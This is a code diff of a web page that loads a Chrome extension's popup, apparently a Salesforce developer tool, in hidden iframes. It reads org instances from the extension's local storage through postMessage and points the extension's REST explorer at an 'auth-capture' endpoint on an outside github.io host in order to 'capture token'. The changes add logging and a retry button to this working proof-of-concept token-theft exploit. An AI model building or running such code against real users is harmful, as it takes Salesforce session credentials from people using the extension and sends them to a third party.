@@ -6,45 +6,45 @@
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
         #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
         #requestInfo { background: #e3f2fd; padding: 15px; border-radius: 4px; margin-top: 20px; }
+        #debugLog { background: #fff3cd; padding: 15px; border-radius: 4px; margin-top: 20px; }
         .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
         button { padding: 10px 20px; margin: 10px 0; cursor: pointer; }
         pre { white-space: pre-wrap; }
     </style>
 </head>
 <body>
+    <div id="debugLog">Starting initialization...</div>
     <div id="messages">Initializing...</div>
     <div id="requestInfo"></div>
     <div id="controls"></div>
     <script>
+        const debugLogDiv = document.getElementById('debugLog');
         const messagesDiv = document.getElementById('messages');
         const requestInfoDiv = document.getElementById('requestInfo');
         const controlsDiv = document.getElementById('controls');
+
+        function log(message) {
+            const timestamp = new Date().toISOString();
+            debugLogDiv.innerHTML += `<br>${timestamp}: ${message}`;
+            console.log(`${timestamp}: ${message}`);
+        }
 
         // Use relative path that will be concatenated with Salesforce instance
         const CAPTURE_ENDPOINT = '.samanattar.github.io/auth-capture';
 
         function createExplorerUrl(orgInstance) {
-            // The dot at the start makes it relative to the Salesforce instance
+            log(`Creating explorer URL for org: ${orgInstance}`);
             const params = new URLSearchParams({
                 endpoint: CAPTURE_ENDPOINT,
                 method: 'GET',
-                format: 'json',
-                contentType: 'application/json'
+                format: 'json'
             });
             
-            const url = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
-            
-            requestInfoDiv.innerHTML += `
-                <h3>Generated Explorer URL:</h3>
-                <pre>${url}</pre>
-                <h3>Expected Full Request URL:</h3>
-                <pre>https://${orgInstance}${CAPTURE_ENDPOINT}</pre>
-            `;
-
-            return url;
+            return `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
         }
 
         function loadExplorer(orgInstance) {
+            log(`Loading explorer for org: ${orgInstance}`);
             const frame = document.querySelector('.explorer-frame');
             if (frame) {
                 frame.remove();
@@ -54,55 +54,80 @@
             newFrame.src = createExplorerUrl(orgInstance);
             newFrame.className = 'explorer-frame';
             document.body.appendChild(newFrame);
-
-            requestInfoDiv.innerHTML += `
-                <h3>Loading explorer for org:</h3>
-                <pre>${orgInstance}</pre>
-            `;
         }
 
+        // Add error handling for iframe loading
+        function initializeExtension() {
+            log('Creating initialization frame...');
+            const initFrame = document.createElement('iframe');
+            
+            initFrame.onload = () => {
+                log('Initialization frame loaded');
+            };
+
+            initFrame.onerror = (error) => {
+                log(`Error loading initialization frame: ${error}`);
+            };
+
+            initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
+            initFrame.style.display = 'none';
+            document.body.appendChild(initFrame);
+            
+            log('Initialization frame created and appended');
+        }
+
+        // Handle all messages
         window.addEventListener('message', function(event) {
-            // Filter out React DevTools messages
-            if (event.data.source?.includes('react-devtools')) {
-                return;
-            }
+            log(`Received message from: ${event.origin}`);
+            
+            try {
+                // Log the type of message received
+                if (event.data) {
+                    if (event.data.source) {
+                        log(`Message source: ${event.data.source}`);
+                    }
+                    if (event.data.insextInitRequest) {
+                        log('Received init request from extension');
+                        
+                        const storage = event.data.iFrameLocalStorage || {};
+                        const instances = Object.keys(storage)
+                            .filter(key => key.endsWith('_orgInstance'))
+                            .map(key => ({
+                                key: key,
+                                instance: storage[key]
+                            }));
 
-            if (event.data.insextInitRequest) {
-                const storage = event.data.iFrameLocalStorage || {};
-                
-                // Get all org instances
-                const instances = Object.keys(storage)
-                    .filter(key => key.endsWith('_orgInstance'))
-                    .map(key => ({
-                        key: key,
-                        instance: storage[key]
-                    }));
+                        log(`Found ${instances.length} org instances`);
 
-                messagesDiv.innerHTML = `
-                    <h3>Select an org to capture token:</h3>
-                    <ul style="list-style: none; padding: 0;">
-                        ${instances.map(inst => `
-                            <li style="margin: 10px 0;">
-                                <button onclick="loadExplorer('${inst.instance}')">
-                                    ${inst.instance}
-                                </button>
-                            </li>
-                        `).join('')}
-                    </ul>
-                `;
-
-                requestInfoDiv.innerHTML = `
-                    <h3>Capture endpoint:</h3>
-                    <pre>${CAPTURE_ENDPOINT}</pre>
-                `;
+                        messagesDiv.innerHTML = `
+                            <h3>Select an org to capture token:</h3>
+                            <ul style="list-style: none; padding: 0;">
+                                ${instances.map(inst => `
+                                    <li style="margin: 10px 0;">
+                                        <button onclick="loadExplorer('${inst.instance}')">
+                                            ${inst.instance}
+                                        </button>
+                                    </li>
+                                `).join('')}
+                            </ul>
+                        `;
+                    }
+                }
+            } catch (error) {
+                log(`Error processing message: ${error.message}`);
             }
         });
 
-        // Initialize connection to extension
-        const initFrame = document.createElement('iframe');
-        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
-        initFrame.style.display = 'none';
-        document.body.appendChild(initFrame);
+        // Initialize immediately
+        log('Starting initialization process');
+        initializeExtension();
+
+        // Add a manual retry button
+        controlsDiv.innerHTML = `
+            <button onclick="initializeExtension()">
+                Retry Initialization
+            </button>
+        `;
     </script>
 </body>
 </html>
